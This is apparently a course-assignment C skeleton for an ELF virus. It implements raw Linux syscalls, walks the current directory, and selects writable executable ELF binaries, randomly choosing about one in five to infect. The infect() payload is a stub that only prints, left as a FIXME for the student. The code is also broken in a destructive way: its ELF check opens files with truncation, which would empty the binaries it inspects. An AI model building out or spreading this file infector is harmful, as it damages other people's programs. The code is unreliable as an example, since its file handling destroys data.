#define _XOPEN_SOURCE 500

#define ROOT_DIR   (".")
#define SPARE_FDS  (4)
#define MAX_FDS	(512)

#define DEBUG 	1

// types.h

typedef unsigned int size_t;

typedef unsigned long int uintptr; /* size_t */
typedef long int intptr; /* ssize_t */

// end types.h

// elf.h

#define EI_NIDENT	16

/* 64-bit ELF base types. */
typedef unsigned long long	Elf64_Addr;
typedef unsigned short	Elf64_Half;
typedef signed short	Elf64_SHalf;
typedef unsigned long long	Elf64_Off;
typedef signed int	Elf64_Sword;
typedef unsigned int	Elf64_Word;
typedef unsigned long long	Elf64_Xword;
typedef signed long long	Elf64_Sxword;

typedef struct elf64_hdr {
  unsigned char	e_ident[EI_NIDENT];	/* ELF "magic number" */
  Elf64_Half e_type;
  Elf64_Half e_machine;
  Elf64_Word e_version;
  Elf64_Addr e_entry;		/* Entry point virtual address */
  Elf64_Off e_phoff;		/* Program header table file offset */
  Elf64_Off e_shoff;		/* Section header table file offset */
  Elf64_Word e_flags;
  Elf64_Half e_ehsize;
  Elf64_Half e_phentsize;
  Elf64_Half e_phnum;
  Elf64_Half e_shentsize;
  Elf64_Half e_shnum;
  Elf64_Half e_shstrndx;
} Elf64_Ehdr;

#define	ELFMAG0		0x7f		// EI_MAG
#define	ELFMAG1		'E'
#define	ELFMAG2		'L'
#define	ELFMAG3		'F'
#define	ELFMAG		"\177ELF"

// end elf.h


// resource.h

#define	RLIMIT_OFILE	8

struct rlimit {
	unsigned long	rlim_cur;		/* current (soft) limit */
	unsigned long	rlim_max;		/* maximum value for rlim_cur */
};

// end resource.h

// dirent.h

struct linux_dirent {
	unsigned long  d_ino;	 /* Inode number */
	unsigned long  d_off;	 /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char		   d_name[];  /* Filename (null-terminated) */
						/* length is actually (d_reclen - 2 -
						   offsetof(struct linux_dirent, d_name) */
	/*
	char		   pad;	   // Zero padding byte
	char		   d_type;	// File type (only since Linux 2.6.4;
							  // offset is (d_reclen - 1))
	*/

};

// end dirent.h

// stat.h

// from my kernel's header

typedef long long __kernel_long_t;
typedef unsigned long long __kernel_ulong_t;

typedef __kernel_ulong_t	dev_t;
typedef __kernel_ulong_t	ino_t;
typedef __kernel_ulong_t	nlink_t;
typedef unsigned int 		uid_t;
typedef uid_t 				gid_t;
typedef unsigned int 		mode_t;

struct stat {
	__kernel_ulong_t	st_dev;
	__kernel_ulong_t	st_ino;
	__kernel_ulong_t	st_nlink;

	unsigned int		st_mode;
	unsigned int		st_uid;
	unsigned int		st_gid;
	unsigned int		__pad0;
	__kernel_ulong_t	st_rdev;
	__kernel_long_t		st_size;
	__kernel_long_t		st_blksize;
	__kernel_long_t		st_blocks;	// Number 512-byte blocks allocated.

	__kernel_ulong_t	st_atime;
	__kernel_ulong_t	st_atime_nsec;
	__kernel_ulong_t	st_mtime;
	__kernel_ulong_t	st_mtime_nsec;
	__kernel_ulong_t	st_ctime;
	__kernel_ulong_t	st_ctime_nsec;
	__kernel_long_t		__unused[3];
};

/*
// from my kernel's header

// ? maybe this can help?
// #if __BITS_PER_LONG == 64

# define timespec64 timespec

typedef signed long long time64_t;
struct timespec64 {
	time64_t	tv_sec;			// seconds
	long		tv_nsec;		// nanoseconds
};

// originally kstat
struct stat {
	u32		result_mask;	// What fields the user got
	umode_t		mode;
	unsigned int	nlink;
	uint32_t	blksize;	// Preferred I/O size
	u64		attributes;
	u64		attributes_mask;
//#define KSTAT_ATTR_FS_IOC_FLAGS				\
	(STATX_ATTR_COMPRESSED |			\
	 STATX_ATTR_IMMUTABLE |				\
	 STATX_ATTR_APPEND |				\
	 STATX_ATTR_NODUMP |				\
	 STATX_ATTR_ENCRYPTED				\
	 )// Attrs corresponding to FS_*_FL flags
	u64		ino;
	dev_t		dev;
	dev_t		rdev;
	kuid_t		uid;
	kgid_t		gid;
	loff_t		size;
	struct timespec	atime;
	struct timespec	mtime;
	struct timespec	ctime;
	struct timespec	btime;			// File creation time
	u64		blocks;
};*/

// from a weird reference
/*typedef unsigned long	dev_t;
typedef unsigned long	ino_t;

typedef	unsigned long	mode_t;			// (historical version)
typedef	unsigned long	nlink_t;		// (historical version)
typedef	long	pid_t;			// (historical version)
typedef	int	uid_t;

typedef	uid_t	gid_t;

typedef long long	off_t;

typedef	long	time_t;

struct stat
{
	dev_t	st_dev;			// inode's device
	ino_t	st_ino;			// inode's number
	mode_t	st_mode;		// inode protection mode
	nlink_t	st_nlink;		// number of hard links
	uid_t	st_uid;			// user ID of the file's owner
	gid_t	st_gid;			// group ID of the file's group
	dev_t	st_rdev;		// device type
	off_t	st_size;		// file size, in bytes
	time_t	st_atime;		// time of last access
	long	st_spare1;
	time_t	st_mtime;		// time of last data modification
	long	st_spare2;
	time_t	st_ctime;		// time of last file status change
	long	st_spare3;
	long	st_blksize;		// optimal blocksize for I/O
	long	st_blocks;		// blocks allocated for file
	unsigned long	st_flags;		// user defined flags for file
	unsigned long	st_gen;			// file generation number
};*/
/*
// from bootlin https://elixir.bootlin.com/linux/v3.1/source/include/asm-generic/stat.h#L23
struct stat {
	unsigned long	st_dev;		// Device.
	unsigned long	st_ino;		// File serial number.
	unsigned int	st_mode;	// File mode.
	unsigned int	st_nlink;	// Link count.
	unsigned int	st_uid;		// User ID of the file's owner.
	unsigned int	st_gid;		// Group ID of the file's group
	unsigned long	st_rdev;	// Device number, if device.
	unsigned long	__pad1;
	long		st_size;	// Size of file, in bytes.
	int		st_blksize;	// Optimal block size for I/O.
	int		__pad2;
	long		st_blocks;	// Number 512-byte blocks allocated.
	long		st_atime;	// Time of last access.
	unsigned long	st_atime_nsec;
	long		st_mtime;	// Time of last modification.
	unsigned long	st_mtime_nsec;
	long		st_ctime;	// Time of last status change.
	unsigned long	st_ctime_nsec;
	unsigned int	__unused4;
	unsigned int	__unused5;
};

// from linux 4.13.0 orig kernel source code

typedef unsigned int u32;
typedef signed int s32;
typedef unsigned short u16;
typedef signed short s16;
typedef unsigned long long u64;
typedef signed long long s64;

typedef u32		compat_size_t;
typedef s32		compat_ssize_t;
typedef s32		compat_time_t;
typedef s32		compat_clock_t;
typedef s32		compat_pid_t;
typedef u16		__compat_uid_t;
typedef u16		__compat_gid_t;
typedef u32		__compat_uid32_t;
typedef u32		__compat_gid32_t;
typedef u16		compat_mode_t;
typedef u32		compat_ino_t;
typedef u16		compat_dev_t;
typedef s32		compat_off_t;
typedef s64		compat_loff_t;
typedef u16		compat_nlink_t;

typedef compat_dev_t	dev_t;
typedef compat_ino_t	ino_t;
typedef compat_nlink_t	nlink_t;
typedef compat_mode_t	mode_t;

//struct compat_stat {
struct stat {
	compat_dev_t	st_dev;
	u16		__pad1;
	compat_ino_t	st_ino;
	compat_mode_t	st_mode;
	compat_nlink_t	st_nlink;
	__compat_uid_t	st_uid;
	__compat_gid_t	st_gid;
	compat_dev_t	st_rdev;
	u16		__pad2;
	u32		st_size;
	u32		st_blksize;
	u32		st_blocks;
	u32		st_atime;
	u32		st_atime_nsec;
	u32		st_mtime;
	u32		st_mtime_nsec;
	u32		st_ctime;
	u32		st_ctime_nsec;
	u32		__unused4;
	u32		__unused5;
};*/

#define S_IFMT  00170000
#define S_IFSOCK 0140000
#define S_IFLNK	 0120000
#define S_IFREG  0100000
#define S_IFBLK  0060000
#define S_IFDIR  0040000
#define S_IFCHR  0020000
#define S_IFIFO  0010000
#define S_ISUID  0004000
#define S_ISGID  0002000
#define S_ISVTX  0001000

#define S_ISLNK(m)	(((m) & S_IFMT) == S_IFLNK)
#define S_ISREG(m)	(((m) & S_IFMT) == S_IFREG)
#define S_ISDIR(m)	(((m) & S_IFMT) == S_IFDIR)
#define S_ISCHR(m)	(((m) & S_IFMT) == S_IFCHR)
#define S_ISBLK(m)	(((m) & S_IFMT) == S_IFBLK)
#define S_ISFIFO(m)	(((m) & S_IFMT) == S_IFIFO)
#define S_ISSOCK(m)	(((m) & S_IFMT) == S_IFSOCK)

//#define	S_ISUID	0004000			/* set user id on execution */
//#define	S_ISGID	0002000			/* set group id on execution */
#define	S_ISTXT	0001000			/* sticky bit */

#define	S_IRWXU	00700			/* RWX mask for owner */
#define	S_IRUSR	00400			/* R for owner */
#define	S_IWUSR	00200			/* W for owner */
#define	S_IXUSR	00100			/* X for owner */\

#define	S_IRWXG	0000070			/* RWX mask for group */
#define	S_IRGRP	0000040			/* R for group */
#define	S_IWGRP	0000020			/* W for group */
#define	S_IXGRP	0000010			/* X for group */

#define	S_IRWXO	0000007			/* RWX mask for other */
#define	S_IROTH	0000004			/* R for other */
#define	S_IWOTH	0000002			/* W for other */
#define	S_IXOTH	0000001			/* X for other */

// end stat.h

// syscall.h
#define SYS_READ	0
#define SYS_WRITE   1
#define SYS_OPEN	2
#define SYS_CLOSE   3
#define SYS_STAT	4
#define SYS_FSTAT   5
#define SYS_MMAP	9
#define SYS_GETPID  39
#define SYS_GETDENTS	78
#define SYS_GETCWD  79
#define SYS_CHMOD	90
#define SYS_FCHMOD	91
#define SYS_GETRLIMIT   97
#define SYS_PTRACE  101
#define SYS_GETUID  102
#define SYS_GETGID  104
#define SYS_GETEUID 107
#define SYS_GETEGID 108
#define SYS_GETPPID 110
#define SYS_GETPGRP 111
#define SYS_GETDENTS64  217

intptr read(int fd, char *buf, uintptr nbytes);
intptr write(int fd, void const* data, uintptr nbytes);
intptr open3(const char *filename, intptr flags, intptr mode);
intptr open(const char *filename, intptr flags);
intptr close(int fd);
intptr getuid();
intptr getrlimit(unsigned int resource, struct rlimit *rlim);
intptr getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
intptr getcwd(char *buf, unsigned long size);
intptr stat(const char *filename, struct stat *statbuf);
intptr fstat(unsigned int fd, struct stat *statbuf);
intptr chmod(const char *filename, mode_t mode);
intptr fchmod(unsigned int fd, mode_t mode);

void* syscall5(
	void* number,
	void* arg1,
	void* arg2,
	void* arg3,
	void* arg4,
	void* arg5
);

void* syscall4(
	void* number,
	void* arg1,
	void* arg2,
	void* arg3,
	void* arg4
);

void* syscall3(
	void* number,
	void* arg1,
	void* arg2,
	void* arg3
);

void* syscall2(
	void* number,
	void* arg1,
	void* arg2
);

void* syscall1(
	void* number,
	void* arg1
);

void* syscall(
	void* number
);

// end syscall.h

// stdio.h

#define NULL	0
int my_memcmp(const unsigned char *str1, const unsigned char *str2, size_t count);

// end stdio.h

// fcntl.h

#define	O_RDONLY	0x0000		/* open for reading only */
#define	O_WRONLY	0x0001		/* open for writing only */
#define	O_RDWR		0x0002		/* open for reading and writing */
#define	O_ACCMODE	0x0003		/* mask for above modes */

#define O_CREAT		00000100	/* not fcntl */
#define O_EXCL		00000200	/* not fcntl */
#define O_NOCTTY	00000400	/* not fcntl */
#define O_TRUNC		00001000	/* not fcntl */
#define O_APPEND	00002000
#define O_NONBLOCK	00004000
#define O_DSYNC		00010000	/* used to be O_SYNC, see below */
#define FASYNC		00020000	/* fcntl, for BSD compatibility */
#define O_DIRECT	00040000	/* direct disk access hint */
#define O_LARGEFILE	00100000
#define O_DIRECTORY	00200000	/* must be a directory */
#define O_NOFOLLOW	00400000	/* don't follow links */
#define O_NOATIME	01000000
#define O_CLOEXEC	02000000	/* set close_on_exec */

// end fcntl.h

// ftw.h

/*
 * Valid flags for the 3rd argument to the function that is passed as the
 * second argument to ftw(3) and nftw(3).  Say it three times fast!
 */
#define	FTW_F		0	/* File.  */
#define	FTW_D		1	/* Directory.  */
#define	FTW_DNR		2	/* Directory without read permission.  */
#define	FTW_DP		3	/* Directory with subdirectories visited.  */
#define	FTW_NS		4	/* Unknown type; stat() failed.  */
#define	FTW_SL		5	/* Symbolic link.  */
#define	FTW_SLN		6	/* Sym link that names a nonexistent file.  */

/*
 * Flags for use as the 4th argument to nftw(3).  These may be ORed together.
 */
#define	FTW_PHYS	0x01	/* Physical walk, don't follow sym links.  */
#define	FTW_MOUNT	0x02	/* The walk does not cross a mount point.  */
#define	FTW_DEPTH	0x04	/* Subdirs visited before the dir itself. */
#define	FTW_CHDIR	0x08	/* Change to a directory before reading it. */

struct FTW {
	int base;
	int level;
};

// end ftw.h

// fts.h

typedef struct _fts {
	struct _ftsent *fts_cur;	/* current node */
	struct _ftsent *fts_child;	/* linked list of children */
	struct _ftsent **fts_array;	/* sort array */
	dev_t fts_dev;			/* starting device # */
	char *fts_path;			/* path for this descent */
	int fts_rfd;			/* fd for root */
	int fts_pathlen;		/* sizeof(path) */
	int fts_nitems;			/* elements in the sort array */
	int (*fts_compar)();		/* compare function */

#define	FTS_COMFOLLOW	0x001		/* follow command line symlinks */
#define	FTS_LOGICAL	0x002		/* logical walk */
#define	FTS_NOCHDIR	0x004		/* don't change directories */
#define	FTS_NOSTAT	0x008		/* don't get stat info */
#define	FTS_PHYSICAL	0x010		/* physical walk */
#define	FTS_SEEDOT	0x020		/* return dot and dot-dot */
#define	FTS_XDEV	0x040		/* don't cross devices */
#define	FTS_WHITEOUT	0x080		/* return whiteout information */
#define	FTS_OPTIONMASK	0x0ff		/* valid user option mask */

#define	FTS_NAMEONLY	0x100		/* (private) child names only */
#define	FTS_STOP	0x200		/* (private) unrecoverable error */
	int fts_options;		/* fts_open options, global flags */
} FTS;

typedef struct _ftsent {
	struct _ftsent *fts_cycle;	/* cycle node */
	struct _ftsent *fts_parent;	/* parent directory */
	struct _ftsent *fts_link;	/* next file in directory */
	long fts_number;			/* local numeric value */
	void *fts_pointer;			/* local address value */
	char *fts_accpath;		/* access path */
	char *fts_path;			/* root path */
	int fts_errno;			/* errno for this node */
	int fts_symfd;			/* fd for symlink */
	unsigned short fts_pathlen;		/* strlen(fts_path) */
	unsigned short fts_namelen;		/* strlen(fts_name) */

	ino_t fts_ino;			/* inode */
	dev_t fts_dev;			/* device */
	nlink_t fts_nlink;		/* link count */

#define	FTS_ROOTPARENTLEVEL	-1
#define	FTS_ROOTLEVEL		 0
	short fts_level;		/* depth (-1 to N) */

#define	FTS_D		 1		/* preorder directory */
#define	FTS_DC		 2		/* directory that causes cycles */
#define	FTS_DEFAULT	 3		/* none of the above */
#define	FTS_DNR		 4		/* unreadable directory */
#define	FTS_DOT		 5		/* dot or dot-dot */
#define	FTS_DP		 6		/* postorder directory */
#define	FTS_ERR		 7		/* error; errno is set */
#define	FTS_F		 8		/* regular file */
#define	FTS_INIT	 9		/* initialized only */
#define	FTS_NS		10		/* stat(2) failed */
#define	FTS_NSOK	11		/* no stat(2) requested */
#define	FTS_SL		12		/* symbolic link */
#define	FTS_SLNONE	13		/* symbolic link without target */
#define	FTS_W		14		/* whiteout object */
	unsigned short fts_info;		/* user flags for FTSENT structure */

#define	FTS_DONTCHDIR	 0x01		/* don't chdir .. to the parent */
#define	FTS_SYMFOLLOW	 0x02		/* followed a symlink to get here */
#define	FTS_ISW		 0x04		/* this is a whiteout object */
	unsigned short fts_flags;		/* private flags for FTSENT structure */

#define	FTS_AGAIN	 1		/* read node again */
#define	FTS_FOLLOW	 2		/* follow symbolic link */
#define	FTS_NOINSTR	 3		/* no instructions */
#define	FTS_SKIP	 4		/* discard node */
	unsigned short fts_instr;		/* fts_set() instructions */

	struct stat *fts_statp;		/* stat(2) information */
	char fts_name[1];		/* file name */
} FTSENT;

// end fts.h

// limits.h

#define	_POSIX_OPEN_MAX		20
#define OPEN_MAX			_POSIX_OPEN_MAX

// end limits.h

// fs.h

#define DT_UNKNOWN	0
#define DT_FIFO		1
#define DT_CHR		2
#define DT_DIR		4
#define DT_BLK		6
#define DT_REG		8
#define DT_LNK		10
#define DT_SOCK		12
#define DT_WHT		14

// end fs.h

uintptr my_strlen(char const* str);
char* my_strncat(char *dest, const char *src, size_t n);
char * my_strncpy(char *dest, const char *src, size_t n);
void reverse(char str[], int length);
char* itoa(int num, char* str, int base);
int infect(const char* fpath);

// syscall.c

intptr read(int fd, char *buf, uintptr nbytes)
{
	return (intptr)
		syscall3(
			(void*)SYS_READ,
			(void*)(intptr)fd,
			(void*)buf,
			(void*)nbytes
		);
}

intptr write(int fd, void const* data, uintptr nbytes)
{
	return (intptr)
		syscall3(
			(void*)SYS_WRITE,
			(void*)(intptr)fd,
			(void*)data,
			(void*)nbytes
		);
}

intptr open3(const char *filename, intptr flags, intptr mode)
{
	return (intptr)
		syscall3(
			(void*)SYS_OPEN,
			(void*)filename,
			(void*)flags,
			(void*)mode
		);
}

intptr open(const char *filename, intptr flags)
{
	return (intptr)
		syscall2(
			(void*)SYS_OPEN,
			(void*)filename,
			(void*)flags
		);
}

intptr close(int fd)
{
	return (intptr)
		syscall1(
			(void*)SYS_CLOSE,
			(void*)(intptr)fd
		);
}

intptr getuid()
{
	return (intptr)
		syscall(
			(void*)SYS_GETUID
		);
}

intptr getrlimit(unsigned int resource, struct rlimit *rlim)
{
	return (intptr)
		syscall2(
			(void*)SYS_GETRLIMIT,
			(void*)(unsigned long)resource,
			(void*)rlim
		);
}

intptr getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	return (intptr)
		syscall3(
			(void*)SYS_GETDENTS,
			(void*)(unsigned long)fd,
			(void*)dirp,
			(void*)(unsigned long)count
		);
}

intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	return (intptr)
		syscall3(
			(void*)SYS_GETDENTS64,
			(void*)(unsigned long)fd,
			(void*)dirp,
			(void*)(unsigned long)count
		);
}

intptr getcwd(char *buf, unsigned long size)
{
	return (intptr)
		syscall2(
			(void*)SYS_GETCWD,
			(void*)buf,
			(void*)size
		);
}

intptr stat(const char *filename, struct stat *statbuf) {
	return (intptr)
		syscall2(
			(void*)SYS_STAT,
			(void*)filename,
			(void*)statbuf
		);
}

intptr fstat(unsigned int fd, struct stat *statbuf) {
	return (intptr)
		syscall2(
			(void*)SYS_FSTAT,
			(void*)(unsigned long)fd,
			(void*)statbuf
		);
}

intptr chmod(const char *filename, mode_t mode) {
	return (intptr)
		syscall2(
			(void*)SYS_CHMOD,
			(void*)filename,
			(void*)(unsigned long)mode
		);
}

intptr fchmod(unsigned int fd, mode_t mode) {
	return (intptr)
		syscall2(
			(void*)SYS_FCHMOD,
			(void*)(unsigned long)fd,
			(void*)(unsigned long)mode
		);
}

// end syscall.c

// stdio.c

int my_memcmp(const unsigned char *str1, const unsigned char *str2, size_t count)
{
  register const unsigned char *s1 = (const unsigned char*)str1;
  register const unsigned char *s2 = (const unsigned char*)str2;

  while (count-- > 0)
	{
	  if (*s1++ != *s2++)
	  return s1[-1] < s2[-1] ? -1 : 1;
	}
  return 0;
}

// end stdio.c

// resource.c

int getdtablesize()
{
	struct rlimit r;
	if (getrlimit(RLIMIT_OFILE, &r) < 0) {
		return -1;
	}
	return r.rlim_cur;
}

// end resource.c

// nftw.c

int nftw(const char *path, int (*fn)(const char *, const struct stat *), int nfds)
{
	//char * const paths[2] = { (char *)path, NULL };
	int fd;
	int nread;
	char buf[32768];
	char cwd_buf[4096];
	struct linux_dirent *d;
	int bpos;
	char d_type;
	unsigned int path_len, file_len;

	if((fd = open(path, O_RDONLY | O_DIRECTORY)) < 0) {
		return -1;
	}
	
	for ( ; ; ) {
		nread = getdents(fd, (struct linux_dirent*)buf, 32768);
		if (nread == -1) {
			return -1;
		}

		if (nread == 0) {
			break;
		}
		getcwd(cwd_buf,4096);
		path_len = my_strlen(cwd_buf);
		//write(1,cwd_buf,my_strlen(cwd_buf));
		//write(1, "\n", 1);
		//write(1, "--------------- dirent -----------\n",my_strlen("--------------- dirent -----------\n"));
		//write(1, "file type   d_name\n", my_strlen("file type   d_name\n"));
		for (bpos = 0; bpos < nread;) {
			d = (struct linux_dirent *) (buf + bpos);
			//write(1, "%8ld  ", d->d_ino);
			if((d_type = *(buf + bpos + d->d_reclen - 1)) == DT_REG ) {
				if(DEBUG) {
					write(1, "[DEBUG] found reg file : ", my_strlen("[DEBUG] found reg file : "));
					write(1, d->d_name, my_strlen(d->d_name));
					write(1, "\n", 1);
				}
				file_len = my_strlen(d->d_name);
				char abs_path[path_len + file_len + 1 + 1];
				my_strncpy(abs_path, cwd_buf, path_len);
				my_strncat(abs_path,"/", 1);
				my_strncat(abs_path, d->d_name, file_len);
				struct stat statbuf;
				stat(abs_path, &statbuf);
				fn(abs_path, &statbuf);
			}

			/*if(d_type == DT_REG) {
				write(1, "regular", my_strlen("regular"));
			} else if(d_type == DT_DIR) {
				write(1, "directory", my_strlen("directory"));
			} else if(d_type == DT_FIFO) {
				write(1, "FIFO", my_strlen("FIFO"));
			} else if(d_type == DT_SOCK) {
				write(1, "socket", my_strlen("socket"));
			} else if(d_type == DT_LNK) {
				write(1, "symlink", my_strlen("symlink"));
			} else if(d_type == DT_BLK) {
				write(1, "block dev", my_strlen("block dev"));
			} else if(d_type == DT_CHR) {
				write(1, "char dev", my_strlen("char dev"));
			} else if(d_type == DT_UNKNOWN) {
				write(1, "unknown", my_strlen("unknown"));
			} else {
				write(1, "???", my_strlen("???"));
			}
			//printf("%4d %10lld  %s\n", d->d_reclen,(long long) d->d_off, d->d_name);
			write(1, "\t", 1);
			write(1, d->d_name, my_strlen(d->d_name));
			write(1, "\n", 1);*/
			bpos += d->d_reclen;
		}
	}

	return 0;
}

// end nftw.c
const unsigned char magic[] = {ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3};

int can_execute(const struct stat *sb, const char* fpath)
{
	if(DEBUG) {
		write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
		write(1, fpath, my_strlen(fpath));
		if((sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
			|| (sb->st_mode & S_IXOTH)) {
			write(1, " executable", my_strlen(" executable"));
		} else {
			write(1, " non-executable", my_strlen(" non-executable"));
		}
		write(1, "\n", 1);
	}
	return (sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
		|| (sb->st_mode & S_IXOTH);
}

int can_write(const struct stat *sb, const char* fpath)
{
	if(DEBUG) {
		write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
		write(1, fpath, my_strlen(fpath));
		if((sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
			|| (sb->st_mode & S_IWOTH)) {
			write(1, " writable", my_strlen(" writable"));
			char tmp_stino[128];
			itoa(sb->st_ino, tmp_stino, 10);
			write(1, " st_ino(", my_strlen(" st_ino("));
			write(1, tmp_stino, my_strlen(tmp_stino));
			write(1, ")", 1);
			char tmp_stmode[128];
			itoa(sb->st_mode, tmp_stmode, 10);
			write(1, " st_mode(", my_strlen(" st_mode("));
			write(1, tmp_stmode, my_strlen(tmp_stmode));
			write(1, ")", 1);
			char tmp_stnlink[128];
			itoa(sb->st_nlink, tmp_stnlink, 10);
			write(1, " st_nlink(", my_strlen(" st_nlink("));
			write(1, tmp_stnlink, my_strlen(tmp_stnlink));
			write(1, ")", 1);
			char tmp_stuid[128];
			itoa(sb->st_uid, tmp_stuid, 10);
			write(1, " st_uid(", my_strlen(" st_uid("));
			write(1, tmp_stuid, my_strlen(tmp_stuid));
			write(1, ")", 1);
			char tmp_stgid[128];
			itoa(sb->st_gid, tmp_stgid, 10);
			write(1, " st_gid(", my_strlen(" st_gid("));
			write(1, tmp_stgid, my_strlen(tmp_stgid));
			write(1, ")", 1);
			char tmp_stblksize[128];
			itoa(sb->st_blksize, tmp_stblksize, 10);
			write(1, " st_blksize(", my_strlen(" st_blksize("));
			write(1, tmp_stblksize, my_strlen(tmp_stblksize));
			write(1, ")", 1);
			char tmp_stblocks[128];
			itoa(sb->st_blocks, tmp_stblocks, 10);
			write(1, " st_blocks(", my_strlen(" st_blocks("));
			write(1, tmp_stblocks, my_strlen(tmp_stblocks));
			write(1, ")", 1);
			char tmp_stsize[128];
			itoa(sb->st_size, tmp_stsize, 10);
			write(1, " st_size(", my_strlen(" st_size("));
			write(1, tmp_stsize, my_strlen(tmp_stsize));
			write(1, ")", 1);
		} else {
			write(1, " non-writable", my_strlen(" non-writable"));
			if(sb->st_uid != getuid() && (sb->st_mode & S_IWOTH)) {
				write(1, " as no W others", my_strlen(" as no W others"));
			} else if(sb->st_uid == getuid() && (sb->st_mode & S_IWUSR) == 0) {
				write(1, " as no W user", my_strlen(" as no W user"));
			}
		}
		write(1, "\n", 1);
	}
	return (sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
		|| (sb->st_mode & S_IWOTH);
}

int is_elf(const char* fpath)
{
	Elf64_Ehdr header; // Assuming 64-bit ELF file.
	size_t nb;
	int ret = 0;
	//FILE* f;
	int f;

	//f = fopen(fpath, "rb");
	f = open(fpath, O_RDWR | O_TRUNC);
	//f = open(fpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
	if (!f) {
		if(DEBUG) {
			write(1, "[DEBUG] error inspecting file : ", my_strlen("[DEBUG] error inspecting file : "));
			write(1, fpath, my_strlen(fpath));
			write(1, "\n", 1);
		}
		return 0;
	}
	//nb = fread(&header, 1, sizeof(header), f);
	nb = read(f, (char*)&header, sizeof(header));
	if (nb == sizeof(header)) {
		if (my_memcmp(header.e_ident, magic, sizeof(magic)) == 0) {
			ret = 1;
		}
	}
	//fclose(f);
	close(f);

	if(DEBUG) {
		write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
		write(1, fpath, my_strlen(fpath));
		if(ret) {
			write(1, " is ELF", my_strlen(" is ELF"));
		} else {
			write(1, " is not ELF", my_strlen(" is not ELF"));
		}
		write(1, "\n", 1);
	}


	return ret;
}

int random_pick()
{
	int rand = 0;
	int f;
	f = open("/dev/urandom", O_RDONLY);
	read(f, (char*)&rand, 1);
	close(f);
	
	if(DEBUG) {
		write(1, "[DEBUG] rand : ", my_strlen("[DEBUG] rand : "));
		char c = '0' + rand % 5;
		write(1, &c, 1);
		write(1, "\n", 1);
	}
	return rand % 5 == 0; // We infect roughly 1/5 of the binaries.
}

int file_process(const char *fpath,
				 const struct stat *sb)
{
	int ret = 0;

	if (can_execute(sb, fpath)
		&& can_write(sb, fpath)
		&& is_elf(fpath)
		&& random_pick())
	{
		ret = infect(fpath);
	}

	return ret;
}

int main(int argc, char* argv[])
{
	//struct timeval t;
	int nfds = getdtablesize() - SPARE_FDS;
	if(nfds == -5) return -1;
	nfds = nfds > MAX_FDS ? MAX_FDS : nfds;

	//gettimeofday(&t, NULL);
	//srand(t.tv_usec * t.tv_sec);
	nftw(ROOT_DIR, file_process, nfds);
	//write(1, "hello from libc-free world\n", 27);
	return 0;
}

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
//	  The above logic is an example, and you can freely modify it. Note that
//	  you should make the above logic work without calling libc functions.
///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

// http://weeb.ddns.net/0/programming/c_without_standard_library_linux.txt
uintptr my_strlen(char const* str)
{
	char const* p;
	for (p = str; *p; ++p);
	return p - str;
}

// https://linux.die.net/man/3/strcat
char*
my_strncat(char *dest, const char *src, size_t n)
{
    size_t dest_len = my_strlen(dest);
    size_t i;

   for (i = 0 ; i < n && src[i] != '\0' ; i++)
        dest[dest_len + i] = src[i];
    dest[dest_len + i] = '\0';

   return dest;
}

// https://linux.die.net/man/3/strcpy
char *
my_strncpy(char *dest, const char *src, size_t n)
{
    size_t i;

   for (i = 0; i < n && src[i] != '\0'; i++)
        dest[i] = src[i];
    for ( ; i < n; i++)
        dest[i] = '\0';

   return dest;
}

// https://www.geeksforgeeks.org/implement-itoa/
/* A utility function to reverse a string  */
void reverse(char str[], int length)
{
    int start = 0;
    int end = length -1;
    while (start < end)
    {
        char tmp = *(str+start);
        *(str+start) = *(str+end);
        *(str+end) = tmp;
        start++;
        end--;
    }
}
 
// Implementation of itoa()
char* itoa(int num, char* str, int base)
{
    int i = 0;
    int isNegative = 0;
 
    /* Handle 0 explicitely, otherwise empty string is printed for 0 */
    if (num == 0)
    {
        str[i++] = '0';
        str[i] = '\0';
        return str;
    }
 
    // In standard itoa(), negative numbers are handled only with 
    // base 10. Otherwise numbers are considered unsigned.
    if (num < 0 && base == 10)
    {
        isNegative = 1;
        num = -num;
    }
 
    // Process individual digits
    while (num != 0)
    {
        int rem = num % base;
        str[i++] = (rem > 9)? (rem-10) + 'a' : rem + '0';
        num = num/base;
    }
 
    // If number is negative, append '-'
    if (isNegative)
        str[i++] = '-';
 
    str[i] = '\0'; // Append string terminator
 
    // Reverse the string
    reverse(str, i);
 
    return str;
}

// FIXME: your infection logic should be placed here and below.
int infect(const char* fpath)
{
	//printf("%s will be infected.\n", fpath);
	write(1, fpath, my_strlen(fpath));
	write(1, " will be infected.\n", my_strlen(" will be infected.\n"));
	return 0;
}

